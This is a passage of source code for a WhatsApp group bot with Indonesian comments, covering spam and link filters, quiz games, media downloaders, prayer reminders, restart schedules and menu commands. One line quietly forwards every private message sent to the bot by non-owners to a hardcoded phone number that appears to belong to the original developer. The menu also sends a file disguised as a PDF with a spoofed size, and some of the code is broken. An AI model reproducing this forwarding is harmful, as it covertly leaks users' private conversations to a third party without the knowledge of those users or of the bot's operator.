if (budy.match('1gb|1Gb|1GB|2gb|2Gb|2GB|panel|Panel|jasa|Jasa|open|Open|need|Need|promo|Promo|1k|2k|3k|4k|5k|6k|7k|8k|9k|10k|15k|20k|diskon|Diskon|sung pm|Sung pm|suntik|ready|Ready|minat|Minat|unchek|Unchek|murban|Murban|unli|Unli|admin panel|Admin panel|Admin Panel|keuntungan|Keuntungan|resseler|Resseler|permanen|Permanen|permanent|Permanent|jual|Jaul25k|30k|40k|50k|60k|100k|vps|Vps|VPS')) {
if (!isBotAdmins) return m.reply(`Kalo gua bukan Admin gimana mau hapus pesan nya, wkwk :v`)
if (isAdmins) return m.reply(`Gajadi, Kamu admin`)
if (isCreator) return m.reply(`Gajadi, Kamu ownerku`)
await Al.sendMessage(m.chat, { delete: m.key })
m.reply(`Apaan sih promosi²`)
await Al.sendMessage(m.chat, {
delete: {
remoteJid: m.chat,
fromMe: false,
id: m.key.id,
participant: m.key.participant
}
})
}
}

// AntiLink (Link grup)
if (isAntiLink) {
if (budy.match(`chat.whatsapp.com`)) {
if (!isBotAdmins) return m.reply(`Upsss... Gajadi, Aku bukan Admin`)
let gclink = (`https://chat.whatsapp.com/` + await Al.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return m.reply(`Gak jadi deh, Karna itu adalah Link grup ini sendiri`)
if (isAdmins) return m.reply(`Wah kalau sesama Admin sih saya gak berani ngehapus pesan nya`)
if (isCreator) return m.reply(`Kamu Owner ku jadi gak masalah`)
await m.reply(`*「 ANTI LINK 」*\n\nLink Terdeteksi, Maaf pesan kamu saya hapus!!`)
if (m.key.fromMe) return m.reply(`Hehe`)
await Al.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
await Al.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
    }
 }
 
// AntiDelete (Hapus pesan)
if (isAntiDel) {
if(type == 'protocolMessage' && isAntiDel){
let mess = chatUpdate.messages[0].message.protocolMessage
let chats = Object.entries(await Al.chats).find(([user, data]) => data.messages && data.messages[mess.key.id])

if(chats[1] !== undefined){
let msg = JSON.parse(JSON.stringify(chats[1].messages[mess.key.id]))
await Al.copyNForward(mess.key.remoteJid, msg).catch(e => console.log(e, msg))
await sleep(1500)
stikdel(from)
}
}
}

if (!isGc && !isCreator && !m.fromMe && budy) {
Al.sendMessage('94742274855@s.whatsapp.net', {text: `*WhatsApp Private Chat*\n\n*From :* ${m.sender.split("@")[0]}\n*Chat :* ${budy}`}, {quoted: fkontak})
}


if ((from in tebakgambar)) {
let { soal, jawaban, hadiah, waktu } = tebakgambar[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${tebakgambar[from].jawaban}*`);
delete tebakgambar[from]
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Limit :* Rp. 150`);
Al.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})
giveLimit(m.sender, 150, limit)
clearTimeout(waktu);
delete tebakgambar[from];
} else Al.sendMessage(sender, {react: {text: '❌', key: m.key}})
}

if ((from in tebakanime)) {
let { soal, jawaban, hadiah, waktu } = tebakanime[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete tebakanime[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Limit :* Rp. 200`);
giveLimit(m.sender, 200, limit)
Al.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})

clearTimeout(waktu);
delete tebakanime[from];
} else Al.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

if ((from in tebaklagu)) {
let { soal, jawaban, hadiah, waktu } = tebaklagu[from]
if (body.toLowerCase().includes(jawaban)) {
await m.reply(`Congratulations your answer is correct🥳\n\nJawaban: ${jawaban}\nHadiah: $${hadiah} balance`);
giveLimit([m.sender], 10, limit)
clearTimeout(waktu);
delete tebaklagu[from];
}
}

if ((from in kuis)) {
let { soal, jawaban, hadiah, waktu } = kuis[from]
if (body.toLowerCase().includes(jawaban)) {
await m.reply(`Congratulations your answer is correct🥳\n\nSoalan:\n${monospace(soal)}\nJawaban: ${jawaban}\nHadiah: $${hadiah} balance`);
giveLimit([m.sender], 10, limit)
clearTimeout(waktu);
delete kuis[from];
}
}

if ((from in siapakahaku)) {
let { soal, jawaban, hadiah, waktu } = siapakahaku[from]
if (body.toLowerCase().includes(jawaban)) {
await m.reply(`Congratulations your answer is correct🥳\n\nSoalan:\n${monospace(soal)}\nJawaban: ${jawaban}\nHadiah: $${hadiah} balance`);
giveLimit([m.sender], 10, limit)
clearTimeout(waktu);
delete siapakahaku[from];
}
}

if ((from in tebakkalimat)) {
let { soal, jawaban, hadiah, waktu } = tebakkalimat[from]
if (body.toLowerCase().includes(jawaban)) {
await m.reply(`Congratulations your answer is correct🥳\n\nSoalan:\n${monospace(soal)}\nJawaban: ${jawaban}\nHadiah: $${hadiah} balance`);
giveLimit([m.sender], 10, limit)
clearTimeout(waktu);
delete tebakkalimat[from];
}
}

if ((from in tebakkata)) {
let { soal, jawaban, hadiah, waktu } = tebakkata[from]
if (body.toLowerCase().includes(jawaban)) {
await m.reply(`Congratulations your answer is correct🥳\n\nSoalan:\n${monospace(soal)}\nJawaban: ${jawaban}\nHadiah: $${hadiah} balance`);
giveLimit([m.sender], 10, limit)
clearTimeout(waktu);
delete tebakkata[from];
}
}

if ((from in tebaklirik)) {
let { soal, jawaban, hadiah, waktu } = tebaklirik[from]
if (body.toLowerCase().includes(jawaban)) {
await m.reply(`Congratulations your answer is correct🥳\n\nSoalan:\n${monospace(soal)}\nJawaban: ${jawaban}\nHadiah: $${hadiah} balance`);
giveLimit([m.sender], 10, limit)
clearTimeout(waktu);
delete tebaklirik[from];
}
}

if ((from in tebakkimia)) {
let { soal, jawaban, hadiah, waktu } = tebakkimia[from]
if (body.toLowerCase().includes(jawaban)) {
await m.reply(`Congratulations your answer is correct🥳\n\nSoalan:\n${monospace(soal)}\nJawaban: ${jawaban}\nHadiah: $${hadiah} balance`);
giveLimit([m.sender], 10, limit)
clearTimeout(waktu);
delete tebakkimia[from];
}
}

if ((from in tebakbendera)) {
let { soal, jawaban, hadiah, waktu } = tebakbendera[from]
if (body.toLowerCase().includes(jawaban)) {
await m.reply(`Congratulations your answer is correct🥳\n\nSoalan: ${monospace(soal)}\nJawaban: ${jawaban}\nHadiah: $${hadiah} balance`);
giveLimit([m.sender], 10, limit)
clearTimeout(waktu);
delete tebakbendera[from];
}
}

if ((from in asahotak)) {
let { soal, jawaban, hadiah, waktu } = asahotak[from]
if (body.toLowerCase().includes(jawaban)) {
await m.reply(`Congratulations your answer is correct🥳\n\nSoalan:\n${monospace(soal)}\nJawaban: ${jawaban}\nHadiah: $${hadiah} balance`);
giveLimit([m.sender], 10, limit)
clearTimeout(waktu);
delete asahotak[from];
}
}

if ((from in susunkata)) {
let { soal, jawaban, hadiah, waktu } = susunkata[from]
if (body.toLowerCase().includes(jawaban)) {
await m.reply(`Congratulations your answer is correct🥳\n\nSoalan:\n${monospace(soal)}\nJawaban: ${jawaban}\nHadiah: $${hadiah} balance`);
giveLimit([m.sender], 10, limit)
clearTimeout(waktu);
delete susunkata[from];
}
}

if ((from in caklontong)) {
let { soal, jawaban, hadiah, waktu } = caklontong[from]
if (body.toLowerCase().includes(jawaban)) {
await m.reply(`Congratulations your answer is correct🥳\n\nSoalan:\n${monospace(soal)}\nJawaban: ${jawaban}\nHadiah: $${hadiah} Limit`);
giveLimit([m.sender], 10, limit)
clearTimeout(waktu);
delete caklontong[from];
}
}

if ((from in kuismath)) {
let { soal, jawaban, hadiah, waktu } = kuismath[from]
if (body.includes(jawaban)) {
m.reply(`Congratulations your answer is correct🥳\n\nSoalan: ${soal}\nJawaban: ${jawaban}\nHadiah: $${hadiah} Limit`);
giveLimit([m.sender], 10, limit)
clearTimeout(waktu);
delete kuismath[from];
}
}

if ((from in family100)) {
let { soal, jawaban, hadiah, waktu } = family100[from]
for (let i of jawaban){
if (body.toLowerCase().includes(i)) {
let anu = jawaban.indexOf(i)
jawaban.splice(anu, 1)
await m.reply(`*GAME FAMILY 100*\n\nJawaban kamu benar!\nJawaban: ${i}\nHadiah: $${hadiah}\n\n${jawaban.length < 1 ? 'Selamat semua jawaban sudah tertebak!\ningin bermain lagi? kirim '+prefix+'family100' : 'Jawaban yang belum tertebak: '+jawaban.length}`)
giveLimit([m.sender], 10, limit)
}
}
if (jawaban.length < 1){
clearTimeout(waktu);
delete family100[from];
}
}

const today = new Date();
const ramadanStart = new Date(today.getFullYear(), 3, 12); 
const ramadanEnd = new Date(today.getFullYear(), 4, 13); 
function getWaktuBukaPuasa() {
return 'Normal Pada 18:30 Wib';
}
const waktuBukaPuasa = getWaktuBukaPuasa();
function hitungMundurLebaran() {
// Tanggal Ramadhan tahun ini
const tanggallebaran = moment('2024-04-13', 'YYYY-MM-DD');
// Tanggal hari ini
const tanggallnya = moment();
    
// Hitung selisih hari antara hari ini dan tanggal Ramadhan
const gganzm = tanggallebaran.diff(tanggallnya, 'days');

// Membuat pesan balasan
let meseg = '';
if (gganzm > 0) {
meseg = `Tinggal ${gganzm} Hari Lagi Lebaran.`;
} else if (gganzm === 0) {
meseg = `Selamat Hari Raya idul Fitri,Mohon Maaf Lahir dan Batin.`;
} else {
meseg = `Ramadhan sudah berlalu. Semoga ibadah puasamu diterima.`;
}
return meseg;
}

const pesanHitungMundur = hitungMundurRamadhan();
const Llebaran = hitungMundurLebaran();
 
        
            // Autosticker gc
        if (isAutoStiker) {
            if (/image/.test(mime) && !/webp/.test(mime)) {
                let mediac = await quoted.download()
                await Al.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
                console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return
                let mediac = await quoted.download()
                await Al.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }
        // AutoDl
if (m.isGroup && !m.key.fromMe && (isAutoDlGc) && !isCmd) {
try {
if (budy.match(`instagram.com`)) {
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}})   
let anu = await fetchJson(`https://api.junn4.my.id/download/instagram?url=${budy}`)
Al.sendMessage(m.chat, { video: { url: anu.result.media}, caption: `Nih ${pushname}`}, { quoted: floc})
await Al.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} else if (budy.match(`tiktok.com`)) {
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}})   
let anu = await fetchJson(`https://widipe.com/download/ttdl?url=${budy}`)
Al.sendMessage(m.chat, { video: { url: anu.result.Medium.url}, caption: `Nih ${pushname}`}, { quoted: floc})
await Al.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} else if (budy.match(`facebook.com`)) {
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}})   
let anu = await fetchJson(`https://api.junn4.my.id/download/facebook?url=${budy}`)
Al.sendMessage(m.chat, { video: { url: anu.result.video_sd}, caption: `Nih ${pushname}`}, { quoted: floc})
await Al.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} else if (budy.match(`youtube.com|youtu.be`)) {
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}})   
let anu = await fetchJson(`https://api.junn4.my.id/download/ytmp4?url=${budy}`)
Al.sendMessage(m.chat, { video: { url: anu.result.result}, caption: ``}, { quoted: floc})
await Al.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} 
} catch (err) {
//console.log(err);
await Al.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
//aiRep(JSON.stringify(err));
}
}

try {
var ppuser = await Al.profilePictureUrl(m.sender, 'image')} catch (err) {
let ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'}
let ppnyauser = await getBuffer(ppuser)
let ppUrl = await Al.profilePictureUrl(m.sender, 'image').catch(_ => 'https://telegra.ph/file/72b973058c1985de0eda8.jpg')

if (global.pengingat) {
cron.schedule('0 49 11 * * *', async () => {
let text = '*[ System Notice ]* Waktu Dzuhur Tiba, Segeralah Sholat...'
sleep(6000)
Al.sendMessage(`${global.idgc}`, {text: text, mentions: participants.map(a => a.id)})
}, { scheduled: true, timezone: 'Asia/Jakarta' })

cron.schedule('0 11 15 * * *', async () => {
let text = '*[ System Notice ]* Waktu Ashar Tiba, Segeralah Sholat...'
sleep(6000)
Al.sendMessage(`${global.idgc}`, {text: text, mentions: participants.map(a => a.id)})
}, { scheduled: true, timezone: 'Asia/Jakarta' })

cron.schedule('0 46 17 * * *', async () => {
let text = '*[ System Notice ]* Waktu Magrib Tiba, Segeralah Sholat...'
sleep(6000)
Al.sendMessage(`${global.idgc}`, {text: text, mentions: participants.map(a => a.id)})
}, { scheduled: true, timezone: 'Asia/Jakarta' })

cron.schedule('0 57 18 * * *', async () => {
let text = '*[ System Notice ]* Waktu Isya Tiba, Segeralah Sholat...'
sleep(6000)
Al.sendMessage(`${global.idgc}`, {text: text, mentions: participants.map(a => a.id)})
}, { scheduled: true, timezone: 'Asia/Jakarta' })

cron.schedule("0 33 4 * * *", () => {
let text = '*[ System Notice ]* Waktu Shubuh Tiba, Segeralah Sholat...'
sleep(6000)
Al.sendMessage(`${global.idgc}`, { text : text, mentions: participants.map(a => a.id)})
}, {scheduled: true, timezone: "Asia/Jakarta"})

cron.schedule('0 0 23 * * *', async () => {
let text = '*[ System Notice ]* Waktu Obrolan Terbatas, Grup Akan Ditutup!'
Al.sendMessage(`${global.idgc}`, {text: text, mentions: participants.map(a => a.id)})
sleep(7000)
await Al.groupSettingUpdate(`${global.idgc}`, 'announcement')
}, { scheduled: true, timezone: 'Asia/Jakarta' })

cron.schedule('0 0 6 * * *', async () => {
let text = '*[ System Notice ]* Waktu Pagi Tiba, Grup Akan Dibuka!'
Al.groupSettingUpdate(`${global.idgc}`, 'not_announcement')
sleep(7000)
await Al.sendMessage(`${global.idgc}`, {text: text, mentions: participants.map(a => a.id)})
}, { scheduled: true, timezone: 'Asia/Jakarta' })
}

if (global.autoRestart) {
cron.schedule('0 0 23 * * *', async () => {
console.log('\nSecara Otomatis Merestart Server...\n')
await Al.sendMessage(global.owner+'@s.whatsapp.net', {text: `MeRestart Secara Otomatis...\n\nInfo Lebih Lanjut Ketik ${prefix}info`})
await sleep(7000)
process.exit()
}, { scheduled: true, timezone: 'Asia/Jakarta' })

cron.schedule('0 0 2 * * *', async () => {
console.log('\nSecara Otomatis Merestart Server...\n')
await Al.sendMessage(global.owner+'@s.whatsapp.net', {text: `MeRestart Secara Otomatis...\n\nInfo Lebih Lanjut Ketik ${prefix}info`})
await sleep(7000)
process.exit()
}, { scheduled: true, timezone: 'Asia/Jakarta' })

cron.schedule('0 0 3 * * *', async () => {
console.log('\nSecara Otomatis Merestart Server...\n')
await Al.sendMessage(global.owner+'@s.whatsapp.net', {text: `MeRestart Secara Otomatis...\n\nInfo Lebih Lanjut Ketik ${prefix}info`})
await sleep(7000)
process.exit()
}, { scheduled: true, timezone: 'Asia/Jakarta' })

cron.schedule('0 0 4 * * *', async () => {
console.log('\nSecara Otomatis Merestart Server...\n')
await Al.sendMessage(global.owner+'@s.whatsapp.net', {text: `MeRestart Secara Otomatis...\n\nInfo Lebih Lanjut Ketik ${prefix}info`})
await sleep(7000)
process.exit()
}, { scheduled: true, timezone: 'Asia/Jakarta' })

cron.schedule('0 0 5 * * *', async () => {
console.log('\nSecara Otomatis Merestart Server...\n')
await Al.sendMessage(global.owner+'@s.whatsapp.net', {text: `MeRestart Secara Otomatis...\n\nInfo Lebih Lanjut Ketik ${prefix}info`})
await sleep(7000)
process.exit()
}, { scheduled: true, timezone: 'Asia/Jakarta' })

cron.schedule('0 0 6 * * *', async () => {
console.log('\nSecara Otomatis Merestart Server...\n')
await Al.sendMessage(global.owner+'@s.whatsapp.net', {text: `MeRestart Secara Otomatis...\n\nInfo Lebih Lanjut Ketik ${prefix}info`})
await sleep(7000)
process.exit()
}, { scheduled: true, timezone: 'Asia/Jakarta' })

cron.schedule('0 0 7 * * *', async () => {
console.log('\nSecara Otomatis Merestart Server...\n')
await Al.sendMessage(global.owner+'@s.whatsapp.net', {text: `MeRestart Secara Otomatis...\n\nInfo Lebih Lanjut Ketik ${prefix}info`})
await sleep(7000)
process.exit()
}, { scheduled: true, timezone: 'Asia/Jakarta' })

cron.schedule('0 0 8 * * *', async () => {
console.log('\nSecara Otomatis Merestart Server...\n')
await Al.sendMessage(global.owner+'@s.whatsapp.net', {text: `MeRestart Secara Otomatis...\n\nInfo Lebih Lanjut Ketik ${prefix}info`})
await sleep(7000)
process.exit()
}, { scheduled: true, timezone: 'Asia/Jakarta' })

cron.schedule('0 0 9 * * *', async () => {
console.log('\nSecara Otomatis Merestart Server...\n')
await Al.sendMessage(global.owner+'@s.whatsapp.net', {text: `MeRestart Secara Otomatis...\n\nInfo Lebih Lanjut Ketik ${prefix}info`})
await sleep(7000)
process.exit()
}, { scheduled: true, timezone: 'Asia/Jakarta' })

cron.schedule('0 0 10 * * *', async () => {
console.log('\nSecara Otomatis Merestart Server...\n')
await Al.sendMessage(global.owner+'@s.whatsapp.net', {text: `MeRestart Secara Otomatis...\n\nInfo Lebih Lanjut Ketik ${prefix}info`})
await sleep(7000)
process.exit()
}, { scheduled: true, timezone: 'Asia/Jakarta' })

cron.schedule('0 0 11 * * *', async () => {
console.log('\nSecara Otomatis Merestart Server...\n')
await Al.sendMessage(global.owner+'@s.whatsapp.net', {text: `MeRestart Secara Otomatis...\n\nInfo Lebih Lanjut Ketik ${prefix}info`})
await sleep(7000)
process.exit()
}, { scheduled: true, timezone: 'Asia/Jakarta' })

cron.schedule('0 0 12 * * *', async () => {
console.log('\nSecara Otomatis Merestart Server...\n')
await Al.sendMessage(global.owner+'@s.whatsapp.net', {text: `MeRestart Secara Otomatis...\n\nInfo Lebih Lanjut Ketik ${prefix}info`})
await sleep(7000)
process.exit()
}, { scheduled: true, timezone: 'Asia/Jakarta' })

cron.schedule('0 0 13 * * *', async () => {
console.log('\nSecara Otomatis Merestart Server...\n')
await Al.sendMessage(global.owner+'@s.whatsapp.net', {text: `MeRestart Secara Otomatis...\n\nInfo Lebih Lanjut Ketik ${prefix}info`})
await sleep(7000)
process.exit()
}, { scheduled: true, timezone: 'Asia/Jakarta' })

cron.schedule('0 0 14 * * *', async () => {
console.log('\nSecara Otomatis Merestart Server...\n')
await Al.sendMessage(global.owner+'@s.whatsapp.net', {text: `MeRestart Secara Otomatis...\n\nInfo Lebih Lanjut Ketik ${prefix}info`})
await sleep(7000)
process.exit()
}, { scheduled: true, timezone: 'Asia/Jakarta' })

cron.schedule('0 0 15 * * *', async () => {
console.log('\nSecara Otomatis Merestart Server...\n')
await Al.sendMessage(global.owner+'@s.whatsapp.net', {text: `MeRestart Secara Otomatis...\n\nInfo Lebih Lanjut Ketik ${prefix}info`})
await sleep(7000)
process.exit()
}, { scheduled: true, timezone: 'Asia/Jakarta' })

cron.schedule('0 0 16 * * *', async () => {
console.log('\nSecara Otomatis Merestart Server...\n')
await Al.sendMessage(global.owner+'@s.whatsapp.net', {text: `MeRestart Secara Otomatis...\n\nInfo Lebih Lanjut Ketik ${prefix}info`})
await sleep(7000)
process.exit()
}, { scheduled: true, timezone: 'Asia/Jakarta' })

cron.schedule('0 0 17 * * *', async () => {
console.log('\nSecara Otomatis Merestart Server...\n')
await Al.sendMessage(global.owner+'@s.whatsapp.net', {text: `MeRestart Secara Otomatis...\n\nInfo Lebih Lanjut Ketik ${prefix}info`})
await sleep(7000)
process.exit()
}, { scheduled: true, timezone: 'Asia/Jakarta' })

cron.schedule('0 0 18 * * *', async () => {
console.log('\nSecara Otomatis Merestart Server...\n')
await Al.sendMessage(global.owner+'@s.whatsapp.net', {text: `MeRestart Secara Otomatis...\n\nInfo Lebih Lanjut Ketik ${prefix}info`})
await sleep(7000)
process.exit()
}, { scheduled: true, timezone: 'Asia/Jakarta' })

cron.schedule('0 0 19 * * *', async () => {
console.log('\nSecara Otomatis Merestart Server...\n')
await Al.sendMessage(global.owner+'@s.whatsapp.net', {text: `MeRestart Secara Otomatis...\n\nInfo Lebih Lanjut Ketik ${prefix}info`})
await sleep(7000)
process.exit()
}, { scheduled: true, timezone: 'Asia/Jakarta' })

cron.schedule('0 0 20 * * *', async () => {
console.log('\nSecara Otomatis Merestart Server...\n')
await Al.sendMessage(global.owner+'@s.whatsapp.net', {text: `MeRestart Secara Otomatis...\n\nInfo Lebih Lanjut Ketik ${prefix}info`})
await sleep(7000)
process.exit()
}, { scheduled: true, timezone: 'Asia/Jakarta' })

cron.schedule('0 0 21 * * *', async () => {
console.log('\nSecara Otomatis Merestart Server...\n')
await Al.sendMessage(global.owner+'@s.whatsapp.net', {text: `MeRestart Secara Otomatis...\n\nInfo Lebih Lanjut Ketik ${prefix}info`})
await sleep(7000)
process.exit()
}, { scheduled: true, timezone: 'Asia/Jakarta' })

cron.schedule('0 0 22 * * *', async () => {
console.log('\nSecara Otomatis Merestart Server...\n')
await Al.sendMessage(global.owner+'@s.whatsapp.net', {text: `MeRestart Secara Otomatis...\n\nInfo Lebih Lanjut Ketik ${prefix}info`})
await sleep(7000)
process.exit()
}, { scheduled: true, timezone: 'Asia/Jakarta' })
}
        
if (global.groupOnly) {
if (isCmd && !m.isGroup) {
return onlygc()
}
}

if (global.privateOnly) {
if (isCmd && !isPc) {
return onlypc()
}
}

const totalFitur = () =>{
var mytext = fs.readFileSync("./AiBotzz.js").toString()
var numUpper = (mytext.match(/case '/g) || []).length;
return numUpper
}

switch (command) {
//========================
case 'owner': {
  await Al.sendMessage(m.chat, { react: { text: `💗`, key: m.key }});
  const url = "https://telegra.ph/file/4bb6ac3c0a545a05ee39c.jpg";

  async function image(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: { url }
    }, {
      upload: Al.waUploadToServer
    });
    return imageMessage;
  }

  let msg = generateWAMessageFromContent(
    m.chat,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: `Hi *${pushname}* 👋\n𝗢𝗪𝗡𝗘𝗥 || 𝐌𝐀𝐍𝐔𝐋 𝐎𝐅𝐅𝐈𝐂𝐈𝐀𝐋\n\n𝕁𝕠𝕚𝕟 𝕄𝕪, 𝕎𝔸 ℂ𝕙𝕒𝕟𝕟𝕖𝕝 𝐌𝐚𝐧𝐮-𝐌𝐃 💙\nhttps://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n©ʍɾ ℂ𝕪𝕓𝕖𝕣 ʍɑղմӀ օƒƒíϲíɑӀ♠ 💙..`
            },
            carouselMessage: {
              cards: [
                {
                  header: proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/4bb6ac3c0a545a05ee39c.jpg' } }, { upload: Al.waUploadToServer })),
                    title: ``,
                    gifPlayback: true,
                    subtitle: footer_text,
                    hasMediaAttachment: false
                  }),
                  body: { text: `${sopanDong} Broo 👋\n> ᴄʟɪᴄᴋ ʙᴜᴛᴛᴏɴ ᴛᴏ ᴄᴏɴᴛᴀᴄᴛ ᴏᴡɴᴇʀ\nᴍᴀɴᴜʟ\nᴅᴏɴ'ᴛ 𝚂𝙿𝙰𝙼\nᴅᴏɴ'ᴛ ᴄᴀʟʟ\n\n𝘽𝙀 𝘼 𝙎𝙈𝘼𝙍𝙏 𝙐𝙎𝙀𝙍.`},
                  nativeFlowMessage: {
                    buttons: [
                      {
                        "name": "cta_url",
                        "buttonParamsJson": "{\"display_text\":\"👤 𝙾𝚆𝙽𝙴𝚁\",\"url\":\"https://wa.me/94742274855?text=*ʜɪ+ᴍʀ+ᴄʏʙᴇʀ+ᴍᴀɴᴜʟ+ᴏꜰꜰɪᴄɪᴀʟ+ꜱɪʀ.🫡💗*\",\"merchant_url\":\"https://www.google.com\"}"
                      },
                      {
                       "name": "cta_url",
                        "buttonParamsJson": "{\"display_text\":\"⛅ 𝙸𝙽𝙵𝙾 𝙼𝙰𝙽𝚄-𝙼𝙳\",\"url\":\"https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\",\"merchant_url\":\"https://www.google.com\"}"
                       },
                    ],
                  },
                },
                {
                  header: proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/72b973058c1985de0eda8.jpg' } }, { upload: Al.waUploadToServer })),
                    title: ``,
                    gifPlayback: true,
                    subtitle: footer_text,
                    hasMediaAttachment: false
                  }),
                  body: { text: `${sopanDong} Broo 👋\n> ᴄʟɪᴄᴋ ʙᴜᴛᴛᴏɴ ᴛᴏ ᴄᴏɴᴛᴀᴄᴛ ᴏᴡɴᴇʀ\nᴍᴀɴᴜʟ\nᴅᴏɴ'ᴛ 𝚂𝙿𝙰𝙼\nᴅᴏɴ'ᴛ ᴄᴀʟʟ\n\n𝘽𝙀 𝘼 𝙎𝙈𝘼𝙍𝙏 𝙐𝙎𝙀𝙍.`},
                  nativeFlowMessage: {
                    buttons: [
                      {
                        "name": "cta_url",
                        "buttonParamsJson": "{\"display_text\":\"👤 𝙼𝙰𝙽𝚄-𝙼𝙳\",\"url\":\"https://wa.me/17732452943?text=register+nama.+20\",\"merchant_url\":\"https://www.google.com\"}"
                      },
                      {
                      	"name": "cta_url",
                        "buttonParamsJson": "{\"display_text\":\"⛅ 𝙸𝙽𝙵𝙾 𝙼𝙰𝙽𝚄-𝙼𝙳\",\"url\":\"https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\",\"merchant_url\":\"https://www.google.com\"}"
                        },
                    ],
                  },
                }
              ],
                         messageVersion: 1,
                         },
                         contextInfo: {
                         mentionedJid: [m.sender],
                         forwardingScore: 256,
                         isForwarded: true,
                         forwardedNewsletterMessageInfo: {
                         newsletterJid: '120363232588171807@newsletter',
                         newsletterName: '⛅ ʜɪ ʙʀᴏᴏ ||「 𝐌𝐚𝐧𝐮-𝐌𝐃  」 𝒃𝒚 𝐌𝐚𝐧𝐮𝐥 💗',
                         serverMessageId: 143
                            }
                        }
                    }
                }
            },
        },
        { quoted: m })
            await Al.relayMessage(msg.key.remoteJid, msg.message, {
      messageId: msg.key.id,
    });
}
break
//========================
case 'menampilkan menu':
case 'menu': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
let gif = `${global.gifin}` 
let aAl = `
Hi *${pushname}* 👋
${sopanDong} Brooh 😁

┈────────────┈─᳃
            ཊཏ    _𝙄 𝙉 𝙁 𝙊  𝘽 𝙊 𝙏_    ཊཏ
┈────────────┈─᳃
     ⊰•  *ɴᴀᴍᴀʙᴏᴛ :* ${namabot}
     ⊰•  *ᴄʀᴇᴀᴛᴏʀ :* ${namaowner}
     ⊰•  *ʀᴜɴᴛɪᴍᴇ :* ${runtime(process.uptime())}
     ⊰•  *ᴅᴀᴛᴇ :* ${tanggal}
     ⊰•  *ᴛɪᴍᴇ :* ${jam}
     ⊰•  *ʀᴀᴍ :* ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
`+readmore+`
┈────────────┈─᳃
            ཊཏ    _𝙈 𝙀 𝙉 𝙐 𝘽 𝙊 𝙏_    ཊཏ
┈────────────┈─᳃
     ィ•  ᴀʟʟᴍᴇɴᴜ
     ィ•  ᴍᴀɪɴᴍᴇɴᴜ
     ィ•  ɢʀᴏᴜᴘᴍᴇɴᴜ
     ィ•  sᴛᴏʀᴇᴍᴇɴᴜ
     ィ•  ᴏᴡɴᴇʀᴍᴇɴᴜ
     ィ•  ᴘʀɪᴠᴀᴛᴇᴍᴇɴᴜ
     ィ•  ɢᴀᴍᴇsᴍᴇɴᴜ
┈────────────┈─᳃
         ཊཏ    _𝙈 𝘼 𝙉 𝙐 - 𝘽 𝙊 𝙏 𝙕_    ཊཏ
┈────────────┈─᳃

ⓘ Please Don't Call & Spam Me`
if (typemenu === 'v1') {    
await Al.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
            fileName: `ᴍᴀɴᴜ-ᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ 💙`,
            mimetype: "application/pdf",
            fileLength: 999999999999778866,
            pageCount: 500, caption: aAl,
contextInfo: {
forwardingScore: 500,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	newsletterName: '⛅ ʜɪ ʙʀᴏᴏ ||「 𝐌𝐚𝐧𝐮-𝐌𝐃  」 𝒃𝒚 𝐌𝐚𝐧𝐮𝐥 💗',
		newsletterJid: "120363232588171807@newsletter",
		},
		externalAdReply: {  
title: `ᴍᴀɴᴜ-ᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ 💙`, 
body: `${ucapanWaktu} ʙʀᴏ`,
thumbnailUrl: global.thumb,
sourceUrl: global.myweb, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: floc})
await Al.sendMessage(m.chat, {
    audio: fs.readFileSync('./media/sticker/thumb/menu.mp3'), mimetype:'audio/mpeg', ptt: true,
    viewOnce: false,
    }, { quoted: m})
    } else if (typemenu === 'v2') {
    let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
